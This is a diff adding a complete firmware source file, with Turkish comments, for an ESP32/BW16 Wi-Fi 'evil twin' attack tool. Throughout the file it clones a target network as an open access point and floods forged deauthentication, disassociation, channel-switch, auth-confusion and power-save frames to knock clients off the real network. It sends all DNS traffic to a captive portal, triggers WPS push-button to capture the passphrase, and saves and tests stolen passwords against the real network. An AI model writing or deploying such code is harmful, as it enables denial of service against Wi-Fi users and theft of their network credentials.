@@ -1,0 +1,549 @@
+#include <WiFi.h>
+#include "evil_twin.h"
+#include "board_hal.h"
+#include "definitions.h"
+#include "passwords.h"
+#include "types.h"
+#include "web_interface.h"
+#include "definitions.h"
+
+// WPS ve HTTPS redirect yalnızca ESP32'de derlenir
+#ifndef BOARD_BW16
+#include <esp_wifi.h>
+#include <esp_wps.h>
+#include <DNSServer.h>
+#include "https_redirect.h"
+#else
+#include <DNSServer.h>
+#endif
+
+// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
+bool    evil_twin_active  = false;
+String  evil_twin_ssid    = "";
+int     evil_twin_clients = 0;
+int     evil_twin_channel = 1;
+uint8_t evil_twin_bssid[6] = {0};
+
+// ─── WPS PBC durum değişkenleri (yalnızca ESP32) ──────────────────────────────
+bool et_wps_pbc_running  = false;
+bool et_wps_pbc_found    = false;
+char et_wps_pbc_pass[65] = {0};
+
+// ─── İç değişkenler ───────────────────────────────────────────────────────────
+static DNSServer      dns_server;
+static const uint8_t  DNS_PORT = 53;
+static deauth_frame_t et_frame;
+
+static unsigned long et_last_retrack = 0;
+static unsigned long et_last_csa     = 0;
+static unsigned long et_last_led     = 0;
+static unsigned long et_last_deauth  = 0;
+static bool          et_led_state    = false;
+static uint8_t       et_last_client[6] = {0};
+
+// ─── WPS PBC (yalnızca ESP32) ─────────────────────────────────────────────────
+#ifndef BOARD_BW16
+
+static unsigned long et_wps_retry_after = 0;
+static unsigned long et_wps_stop_at     = 0;
+static bool          et_wps_handler_registered = false;
+static volatile int8_t et_wps_evt       = 0;
+static unsigned long et_wps_started_ms  = 0;
+#define ET_WPS_PBC_TIMEOUT_MS 120000UL
+
+static void et_wps_event_cb(void *arg, esp_event_base_t base,
+                             int32_t id, void *data) {
+  if (base != WIFI_EVENT) return;
+  if (id == WIFI_EVENT_STA_WPS_ER_SUCCESS) {
+    wifi_event_sta_wps_er_success_t *e = (wifi_event_sta_wps_er_success_t *)data;
+    if (e && e->ap_cred_cnt > 0) {
+      strncpy(et_wps_pbc_pass, (char *)e->ap_cred[0].passphrase, 64);
+      et_wps_pbc_pass[64] = '\0';
+    }
+    et_wps_evt = 1;
+  } else if (id == WIFI_EVENT_STA_WPS_ER_FAILED ||
+             id == WIFI_EVENT_STA_WPS_ER_TIMEOUT) {
+    et_wps_evt = -1;
+  }
+}
+
+void et_start_wps_pbc() {
+  if (et_wps_pbc_running) return;
+  et_wps_pbc_found   = false;
+  et_wps_pbc_pass[0] = '\0';
+  et_wps_evt         = 0;
+  et_wps_started_ms  = millis();
+  et_wps_pbc_running = true;
+
+  hal_wifi_set_promiscuous(false);
+
+  if (!et_wps_handler_registered) {
+    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
+                               &et_wps_event_cb, nullptr);
+    et_wps_handler_registered = true;
+  }
+
+  wifi_config_t sta_cfg = {};
+  snprintf((char *)sta_cfg.sta.ssid, sizeof(sta_cfg.sta.ssid),
+           "%s", evil_twin_ssid.c_str());
+  sta_cfg.sta.bssid_set = 1;
+  memcpy(sta_cfg.sta.bssid, evil_twin_bssid, 6);
+  sta_cfg.sta.channel   = (uint8_t)evil_twin_channel;
+  esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
+
+  esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
+  esp_wifi_wps_enable(&cfg);
+  esp_wifi_wps_start(0);
+
+  DEBUG_PRINTLN("ET WPS PBC: baslatildi");
+}
+
+void et_stop_wps_pbc() {
+  if (!et_wps_pbc_running) return;
+  et_wps_pbc_running = false;
+  et_wps_evt         = 0;
+  et_wps_retry_after = 0;
+  esp_wifi_wps_disable();
+  DEBUG_PRINTLN("ET WPS PBC: durduruldu");
+}
+
+static void et_wps_pbc_loop() {
+  if (!et_wps_pbc_running) return;
+  unsigned long now = millis();
+
+  if (et_wps_retry_after != 0) {
+    if (now < et_wps_retry_after) return;
+    et_wps_retry_after = 0;
+    hal_wifi_set_promiscuous(false);
+    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
+    esp_wifi_wps_enable(&cfg);
+    esp_wifi_wps_start(0);
+    et_wps_started_ms = now;
+    return;
+  }
+
+  if (et_wps_evt == 1) {
+    et_wps_pbc_running = false;
+    et_wps_pbc_found   = true;
+    esp_wifi_wps_disable();
+
+    String pw = String(et_wps_pbc_pass);
+    if (pw.length() == 0) {
+      wifi_config_t sta_cfg = {};
+      if (esp_wifi_get_config(WIFI_IF_STA, &sta_cfg) == ESP_OK)
+        pw = String((char *)sta_cfg.sta.password);
+    }
+    if (pw.length() > 0) {
+      passwords_save(evil_twin_ssid, pw);
+      evil_twin_test_password(pw);
+    }
+    et_wps_stop_at = millis() + 8000UL;
+
+  } else if (et_wps_evt == -1) {
+    et_wps_evt = 0;
+    esp_wifi_wps_disable();
+    et_wps_retry_after = now + 5000UL;
+
+  } else if (now - et_wps_started_ms > ET_WPS_PBC_TIMEOUT_MS) {
+    et_wps_evt = 0;
+    esp_wifi_wps_disable();
+    et_wps_retry_after = now + 1000UL;
+  }
+}
+
+#else // BOARD_BW16: WPS stub
+
+void et_start_wps_pbc() {}  // RTL8720DN: WPS PBC desteklenmiyor
+void et_stop_wps_pbc()  {}
+
+static unsigned long et_wps_stop_at = 0;
+static void et_wps_pbc_loop() {}
+
+#endif // BOARD_BW16 WPS
+
+// ─── Evil Twin CSA Beacon ─────────────────────────────────────────────────────
+// 2.4 GHz ve 5 GHz desteği: operating class banta göre seçilir
+IRAM_ATTR static void et_send_csa_beacon() {
+  const uint8_t *bssid    = evil_twin_bssid;
+  uint8_t        ssid_len = (uint8_t)evil_twin_ssid.length();
+  uint8_t        channel  = (uint8_t)evil_twin_channel;
+  bool           is5ghz   = IS_5GHZ_CHANNEL(evil_twin_channel);
+
+  uint8_t csa_channel = is5ghz ? 0 : 14;
+  uint8_t op_class    = is5ghz ? get_5ghz_op_class(channel) : 81;
+
+  uint8_t buf[160];
+  uint8_t *p = buf;
+
+  *p++ = 0x80; *p++ = 0x00;
+  *p++ = 0x00; *p++ = 0x00;
+  memset(p, 0xFF, 6); p += 6;
+  memcpy(p, bssid, 6); p += 6;
+  memcpy(p, bssid, 6); p += 6;
+  *p++ = 0x00; *p++ = 0x00;
+
+  memset(p, 0, 8); p += 8;
+  *p++ = 0x64; *p++ = 0x00;
+  *p++ = 0x11; *p++ = 0x04;
+
+  *p++ = 0x00; *p++ = ssid_len;
+  memcpy(p, evil_twin_ssid.c_str(), ssid_len); p += ssid_len;
+
+  *p++ = 0x01; *p++ = 0x08;
+  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
+  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;
+
+  *p++ = 0x03; *p++ = 0x01; *p++ = channel;
+
+  // CSA IE
+  *p++ = 0x25; *p++ = 0x03;
+  *p++ = 0x01; *p++ = csa_channel; *p++ = 0x01;
+
+  // ECSA IE (operating class banta göre)
+  *p++ = 0x3C; *p++ = 0x04;
+  *p++ = 0x01; *p++ = op_class; *p++ = csa_channel; *p++ = 0x01;
+
+  // Quiet IE
+  *p++ = 0x28; *p++ = 0x06;
+  *p++ = 0x01; *p++ = 0x01;
+  *p++ = 0xFF; *p++ = 0x7F;
+  *p++ = 0x00; *p++ = 0x00;
+
+  int flen = (int)(p - buf);
+  for (int i = 0; i < 10; i++) {
+    hal_wifi_80211_tx(HAL_IF_AP, buf, flen);
+    delayMicroseconds(400);
+  }
+}
+
+// ─── Auth confusion ───────────────────────────────────────────────────────────
+IRAM_ATTR static void et_send_auth_confusion(const uint8_t *bssid, const uint8_t *sta) {
+  uint8_t buf[30];
+  uint8_t *p = buf;
+  *p++ = 0xB0; *p++ = 0x00;
+  *p++ = 0x3A; *p++ = 0x01;
+  memcpy(p, sta,   6); p += 6;
+  memcpy(p, bssid, 6); p += 6;
+  memcpy(p, bssid, 6); p += 6;
+  *p++ = 0x00; *p++ = 0x00;
+  *p++ = 0x00; *p++ = 0x00;
+  *p++ = 0x02; *p++ = 0x00;
+  *p++ = 0x0D; *p++ = 0x00;
+  int len = (int)(p - buf);
+  for (int i = 0; i < 10; i++)
+    hal_wifi_80211_tx(HAL_IF_AP, buf, len);
+}
+
+// ─── NULL data power-save spoof ───────────────────────────────────────────────
+IRAM_ATTR static void et_send_null_powerdown(const uint8_t *bssid, const uint8_t *sta) {
+  uint8_t buf[24];
+  uint8_t *p = buf;
+  *p++ = 0x48; *p++ = 0x11;
+  *p++ = 0x00; *p++ = 0x00;
+  memcpy(p, bssid, 6); p += 6;
+  memcpy(p, sta,   6); p += 6;
+  memcpy(p, bssid, 6); p += 6;
+  *p++ = 0x00; *p++ = 0x00;
+  int len = (int)(p - buf);
+  for (int i = 0; i < 10; i++)
+    hal_wifi_80211_tx(HAL_IF_AP, buf, len);
+}
+
+// ─── Proaktif deauth ──────────────────────────────────────────────────────────
+IRAM_ATTR static void et_send_proactive_deauth() {
+  hal_reapply_wifi_power(et_wps_pbc_running);
+
+  static const uint8_t zero[6]    = {0};
+  static const uint8_t reasons[4] = {7, 6, 2, 3};
+  deauth_frame_t f = et_frame;
+
+  memset(f.station, 0xFF, 6);
+  for (int r = 0; r < 4; r++) {
+    f.frame_control[0] = 0xC0; f.reason = reasons[r];
+    for (int i = 0; i < 8; i++)
+      hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
+    f.frame_control[0] = 0xA0;
+    for (int i = 0; i < 8; i++)
+      hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
+  }
+
+  if (memcmp(et_last_client, zero, 6) != 0) {
+    memcpy(f.station, et_last_client, 6);
+    for (int r = 0; r < 4; r++) {
+      f.frame_control[0] = 0xC0; f.reason = reasons[r];
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
+        hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
+      f.frame_control[0] = 0xA0;
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
+        hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
+    }
+
+    deauth_frame_t f_rev = make_deauth_frame();
+    memcpy(f_rev.access_point, evil_twin_bssid, 6);
+    memcpy(f_rev.sender,       et_last_client,  6);
+    memcpy(f_rev.station,      evil_twin_bssid, 6);
+    f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
+    for (int i = 0; i < 10; i++)
+      hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
+    f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
+    for (int i = 0; i < 10; i++)
+      hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
+
+    et_send_auth_confusion(evil_twin_bssid, et_last_client);
+    et_send_null_powerdown(evil_twin_bssid, et_last_client);
+  }
+}
+
+// ─── ET Sniffer (birleşik imza) ───────────────────────────────────────────────
+IRAM_ATTR static void et_sniffer_cb(const uint8_t *frame, uint16_t len) {
+  if (len < sizeof(mac_hdr_t)) return;
+  const wifi_packet_t *pkt = (const wifi_packet_t *)frame;
+  const mac_hdr_t     *hdr = &pkt->hdr;
+
+  if (memcmp(hdr->dest, et_frame.sender, 6) != 0) return;
+
+  memcpy(et_frame.station, hdr->src, 6);
+  memcpy(et_last_client,   hdr->src, 6);
+
+  static const uint8_t reasons[] = {7, 6, 2, 3};
+  for (int r = 0; r < 4; r++) {
+    et_frame.frame_control[0] = 0xC0;
+    et_frame.reason = reasons[r];
+    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
+      hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
+
+    et_frame.frame_control[0] = 0xA0;
+    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
+      hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
+  }
+
+  {
+    deauth_frame_t f_rev = make_deauth_frame();
+    memcpy(f_rev.access_point, evil_twin_bssid, 6);
+    memcpy(f_rev.sender,       hdr->src,         6);
+    memcpy(f_rev.station,      evil_twin_bssid,  6);
+    f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
+    for (int i = 0; i < 10; i++)
+      hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
+    f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
+    for (int i = 0; i < 10; i++)
+      hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
+  }
+
+  memset(et_frame.station, 0xFF, 6);
+  et_frame.frame_control[0] = 0xC0; et_frame.reason = 3;
+  for (int i = 0; i < 6; i++)
+    hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
+  et_frame.frame_control[0] = 0xA0;
+  for (int i = 0; i < 6; i++)
+    hal_wifi_80211_tx(HAL_IF_AP, &et_frame, sizeof(et_frame));
+
+  memcpy(et_frame.station, hdr->src, 6);
+  et_frame.frame_control[0] = 0xC0;
+  et_frame.reason = 1;
+
+  BLINK_LED(1, 10);
+}
+
+// ─── Sniffer başlat ───────────────────────────────────────────────────────────
+static void et_start_sniffer() {
+  hal_wifi_set_promiscuous(true);
+  hal_wifi_set_promiscuous_filter();
+  hal_wifi_set_promiscuous_rx_cb(et_sniffer_cb);
+}
+
+// ─── Evil Twin başlat ─────────────────────────────────────────────────────────
+void start_evil_twin(int wifi_number) {
+  evil_twin_ssid    = WiFi.SSID(wifi_number);
+  evil_twin_channel = WiFi.channel(wifi_number);
+  memcpy(evil_twin_bssid, WiFi.BSSID(wifi_number), 6);
+  evil_twin_clients = 0;
+  evil_twin_active  = true;
+  et_last_retrack   = millis();
+  et_last_csa       = millis();
+
+  DEBUG_PRINT("Evil Twin: ");
+  DEBUG_PRINT(evil_twin_ssid);
+  DEBUG_PRINTF(" Kanal %d %s\n",
+    evil_twin_channel,
+    IS_5GHZ_CHANNEL(evil_twin_channel) ? "(5GHz)" : "(2.4GHz)");
+
+  hal_wifi_set_promiscuous(false);
+
+  et_frame          = make_deauth_frame();
+  et_frame.reason   = 1;
+  memcpy(et_frame.access_point, evil_twin_bssid, 6);
+  memcpy(et_frame.sender,       evil_twin_bssid, 6);
+
+  wifi_mode_t cur_mode = WIFI_MODE_NULL;
+#ifndef BOARD_BW16
+  esp_wifi_get_mode(&cur_mode);
+#endif
+  if (cur_mode != WIFI_MODE_APSTA) {
+    WiFi.mode(WIFI_MODE_APSTA);
+  }
+  WiFi.setAutoReconnect(false);
+  WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
+
+  delay(cur_mode == WIFI_MODE_APSTA ? 80 : 150);
+  apply_max_performance();
+
+  dns_server.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+  et_start_sniffer();
+
+#ifndef BOARD_BW16
+  https_redirect_start();
+  et_start_wps_pbc();
+#endif
+}
+
+// ─── Şifre testi ─────────────────────────────────────────────────────────────
+bool evil_twin_test_password(const String &password) {
+  DEBUG_PRINT("Sifre deneniyor: ");
+  DEBUG_PRINTLN(password);
+
+  WiFi.setAutoReconnect(false);
+  hal_wifi_set_promiscuous(false);
+
+#ifndef BOARD_BW16
+  wifi_config_t sta_cfg = {};
+  snprintf((char *)sta_cfg.sta.ssid,     sizeof(sta_cfg.sta.ssid),     "%s", evil_twin_ssid.c_str());
+  snprintf((char *)sta_cfg.sta.password, sizeof(sta_cfg.sta.password), "%s", password.c_str());
+  sta_cfg.sta.bssid_set = 1;
+  memcpy(sta_cfg.sta.bssid, evil_twin_bssid, 6);
+  sta_cfg.sta.channel = (uint8_t)evil_twin_channel;
+  esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
+  esp_wifi_connect();
+#else
+  WiFi.begin(evil_twin_ssid.c_str(), password.c_str(),
+             evil_twin_channel, evil_twin_bssid);
+#endif
+
+  unsigned long t = millis();
+  bool connected  = false;
+  while (millis() - t < ET_TEST_TIMEOUT_MS) {
+    wl_status_t s = WiFi.status();
+    if (s == WL_CONNECTED)      { connected = true; break; }
+    if (s == WL_CONNECT_FAILED) break;
+    delay(80);
+    web_interface_handle_client();
+    dns_server.processNextRequest();
+  }
+
+#ifndef BOARD_BW16
+  esp_wifi_disconnect();
+#else
+  WiFi.disconnect();
+#endif
+
+  apply_max_performance();
+
+  if (!connected) {
+    delay(200);
+    et_start_sniffer();
+  }
+  return connected;
+}
+
+// ─── Hedef yeniden bulma ───────────────────────────────────────────────────────
+static void et_retrack() {
+  DEBUG_PRINT("ET Hedef taraniyor: ");
+  DEBUG_PRINTLN(evil_twin_ssid);
+
+  hal_wifi_set_promiscuous(false);
+
+  int n = WiFi.scanNetworks(false, true, false, 120);
+  for (int i = 0; i < n; i++) {
+    if (WiFi.SSID(i) == evil_twin_ssid) {
+      int  new_ch  = WiFi.channel(i);
+      bool changed = (new_ch != evil_twin_channel) ||
+                     (memcmp(WiFi.BSSID(i), evil_twin_bssid, 6) != 0);
+      if (changed) {
+        evil_twin_channel = new_ch;
+        memcpy(evil_twin_bssid, WiFi.BSSID(i), 6);
+        memcpy(et_frame.access_point, evil_twin_bssid, 6);
+        memcpy(et_frame.sender,       evil_twin_bssid, 6);
+        WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
+        apply_max_performance();
+        DEBUG_PRINTF("ET yeni kanal: %d %s\n",
+          evil_twin_channel,
+          IS_5GHZ_CHANNEL(evil_twin_channel) ? "(5GHz)" : "(2.4GHz)");
+      }
+      break;
+    }
+  }
+  WiFi.scanDelete();
+  et_start_sniffer();
+}
+
+// ─── Evil Twin döngüsü ────────────────────────────────────────────────────────
+void evil_twin_loop() {
+  if (!evil_twin_active) return;
+
+  dns_server.processNextRequest();
+  evil_twin_clients = WiFi.softAPgetStationNum();
+
+  et_wps_pbc_loop();
+
+  if (et_wps_stop_at && millis() >= et_wps_stop_at) {
+    et_wps_stop_at = 0;
+    stop_evil_twin();
+    return;
+  }
+
+  unsigned long now = millis();
+
+  if (now - et_last_csa >= CSA_INTERVAL_MS) {
+    et_last_csa = now;
+    et_send_csa_beacon();
+  }
+
+  if (now - et_last_deauth >= ET_DEAUTH_INTERVAL_MS) {
+    et_last_deauth = now;
+    et_send_proactive_deauth();
+  }
+
+  if (!et_wps_pbc_running && (now - et_last_retrack >= RETRACK_INTERVAL_MS)) {
+    et_last_retrack = now;
+    et_retrack();
+  }
+
+#ifdef LED
+  if (now - et_last_led >= 1000) {
+    et_last_led = now;
+    et_led_state = !et_led_state;
+    if (evil_twin_clients > 0) {
+      et_led_state ? led_on() : led_off();
+    } else {
+      led_off();
+    }
+  }
+#endif
+}
+
+// ─── Evil Twin durdur ─────────────────────────────────────────────────────────
+void stop_evil_twin() {
+  if (!evil_twin_active) return;
+  evil_twin_active = false;
+
+  et_stop_wps_pbc();
+  hal_wifi_set_promiscuous(false);
+  dns_server.stop();
+
+#ifndef BOARD_BW16
+  https_redirect_stop();
+#endif
+
+  WiFi.softAPdisconnect();
+  WiFi.mode(WIFI_MODE_APSTA);
+  WiFi.softAP(AP_SSID, AP_PASS);
+  apply_max_performance();
+
+  evil_twin_ssid    = "";
+  evil_twin_clients = 0;
+  memset(et_last_client, 0, 6);
+  led_off();
+
+  DEBUG_PRINTLN("Evil Twin durduruldu.");
+}
